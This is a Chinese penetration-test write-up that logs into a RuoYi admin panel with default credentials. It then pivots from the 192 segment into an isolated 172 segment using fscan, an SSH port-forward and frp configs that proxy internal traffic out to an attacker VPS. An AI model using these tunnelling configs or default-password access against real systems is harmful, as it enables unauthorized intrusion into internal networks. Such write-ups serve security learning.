弱口令YYDS

使用网络空间搜索引擎收集一波信息，在一个IP上发现9001、9002、9003端口开放，且是一套系统的三个登录页，通过加载页面发现是若依的管理后台，尝试使用默认账号“admin/admin123”成功登录。
关于若依
这是一个用户量庞大的后台管理系统，当然也存在着不少历史漏洞，如果用户疏忽没有及时更新，就存在被恶意利用的可能。

内网

从给的系统列表看，内网分为192和172两个网段，而拿到的是192段的一台服务器权限，用fscan扫描一波，发现一台双网卡机器（192.168.1.1出网、172.168.1.1不出网）双网卡互通，可突破逻辑隔离与另一个网段进行通信。
所以现在情况就是通过frp隧道代理访问192.168网段，通过192.168.1.1的SSH连接到172.168.1.1来访问172.168网段，经过测试，两个网卡仅允许SSH协议进行通信，那么我们不如将172网段通过端口转发、二层隧道的方式代理出来，这样更方便后续的内网渗透。

代理实现：

1、在172.168.1.1机器上起一个frp的客户端和服务端实现流量从本地端口1234出去。

frps.ini[common]  bind_port = 7000
frpc.ini[common]  server_addr = 172.168.1.1server_port = 7000  
[test172]  type = tcp  remote_port = 1234  plugin = socks5

2、通过ssh协议使流量转发到192.168.1.1机器的2345端口

ssh -f -N -L 192.168.11.1:2345:172.168.1.1:1234 root@172.168.1.1

3、在192.168.1.1配置frpc使vps与2345端口通信。

frpc.ini[common]  server_addr = vpsipserver_port = 443  token = abc   [test192]  type = tcp  remote_port = 1111local_ip = 192.168.1.1 local_port = 2345
vps frps.ini[common]  bind_port = 443  token = abc

接下来就是愉快的在内网里翻找了。

项目总结

1、弱口令作为切入点。配合若依框架的命令执行漏洞getshell。
2、网站关站，机器下线等突发情况的预防，在拿到服务器权限时快速隐秘横向。
3、内网出网机器的二层代理和端口转发配置。
果然实战才是检验自己对各种知识掌握程度的最快途径。
